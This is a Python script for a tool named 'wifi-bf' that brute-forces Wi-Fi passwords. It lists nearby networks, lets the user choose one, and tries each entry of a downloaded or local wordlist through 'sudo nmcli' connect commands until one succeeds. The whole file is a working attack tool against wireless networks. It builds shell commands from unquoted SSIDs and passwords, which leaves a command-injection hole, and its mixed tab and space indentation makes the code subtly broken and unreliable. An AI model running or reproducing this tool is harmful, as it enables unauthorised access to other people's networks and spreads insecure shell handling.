import argparse
import os
from ssid import start
import urllib.request
import sys
import time

# service NetworkManager restart


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def argument_parser():
    """
    This function utilize the argparse which gives a description of the program and
    the list of arguments supported
    """
    parser = argparse.ArgumentParser(prog="wifi-bf", description="Brute force wifi password with python 3")
    parser.add_argument('-u', '--url', type=str, default=None, help='The url that contains the list of passwords')
    parser.add_argument('-f', '--file', type=str, default=None, help='The file that contains the list of passwords')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Optional: Use to show all passwords attempted, rather than just the successful one.')
    return parser.parse_args()


def fetch_password_from_url(url):
    """
    This functions returns a list of passwords from a url
    """
    try:
        return urllib.request.urlopen(url)
    except Exception as e:
        raise Exception(f"{bcolors.FAIL} Fetch failed. Check internet status. {bcolors.ENDC}")


def require_root():
    """
    This functions checks whether the user is running the program as root. If the user is not a root,
    an error message is displayed and the program exit
    """
    r = os.popen("whoami").read()
    if r.strip() != "root":
        print("Run it as root.")
        sys.exit(-1)


def display_targets(networks, security_type):
    """
    This functions shows the user the list of targets
    """
    print("Select a target: \n")

    rows, columns = os.popen('stty size', 'r').read().split()
    for i in range(len(networks)):
        width = len(str(str(i+1)+". "+networks[i]+security_type[i]))+2
        spacer = " "

        if int(columns) >= 100:
            calc = int((int(columns)-int(width))*0.75)
        else:
            calc = int(columns)-int(width)

        for index in range(calc):
            spacer += "."
            if index == (calc-1):
                spacer += " "

        print(str(i+1)+". "+networks[i]+spacer+security_type[i])


def prompt_for_target_choice(max):
    """
    This functions prompt the user to enter the target choice and returns the choice.
    The function runs in a loop until the user enter the correct target
    """
    while True:
        try:
            selected = int(input("\nEnter number of target: "))
            if 1 <= selected <= max:
                return selected - 1
        except Exception as e:
            raise e
        print("Invalid choice: Please pick a number between 1 and " + str(max))


def make_password_trial(selected_network, password_trial, args):

    if args.verbose is True:
        print(f"{bcolors.HEADER} ** TESTING **: with password '{password_trial}'. {bcolors.ENDC}")

    if len(password_trial) >= 8:
        creds = os.popen(f"sudo nmcli dev wifi connect {selected_network} password {password_trial}").read()
        if "Error:" in creds.strip():
            if args.verbose is True:
                print(f"{bcolors.FAIL} ** TESTING **: password '{password_trial}' failed. {bcolors.ENDC}")
        elif "successfully activated" in creds.strip():
            sys.exit(f"{bcolors.OKGREEN} ** KEY FOUND! **: password {password_trial} succeeded. {bcolors.ENDC}")
        else:
            print(f"Something went wrong at trial {password_trial}")
        print(creds)
	time.sleep(3)
    else:
        if args.verbose is True:
            print(f"{bcolors.OKCYAN} ** TESTING **: password {password_trial} too short, passing.{bcolors.ENDC}")


def brute_force(selected_network, passwords, args):
    """
    This function takes the targeted network and list of password and attempt to brute force it.
    """
    for password_trial in passwords:
        make_password_trial(selected_network, password_trial, args)
    print(f"{bcolors.FAIL} ** RESULTS **: All passwords failed :( {bcolors.ENDC}")


def main():
    """ The main function"""
    require_root()
    args = argument_parser()

    # The user chose to supplied their own url
    if args.url is not None:
        passwords = fetch_password_from_url(args.url)
    # user elect to read passwords form a file
    elif args.file is not None:
        file = open(args.file, "r")
        passwords = file.readlines()
        if not passwords:
            print("Password file cannot be empty!")
            exit(0)
        file.close()
    else:
        # fallback to the default list as the user didn't supplied a password list
        default_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
        passwords = fetch_password_from_url(default_url)
	passwords = [password.decode("utf-8") for password in passwords]
    passwords = [password.strip() for password in passwords]
    # grabbing the list of the network ssids
    func_call = start(1)
    networks = func_call[0]
    security_type = func_call[1]
    
    if not networks:
        print("No networks found!")
        sys.exit(-1)

    display_targets(networks, security_type)
    max = len(networks)
    pick = prompt_for_target_choice(max)
    target = networks[pick]
    
    print("\nWifi-bf is running. If you would like to see passwords being tested in realtime, enable the [--verbose] flag at start.")

    brute_force(target, passwords, args)


main()
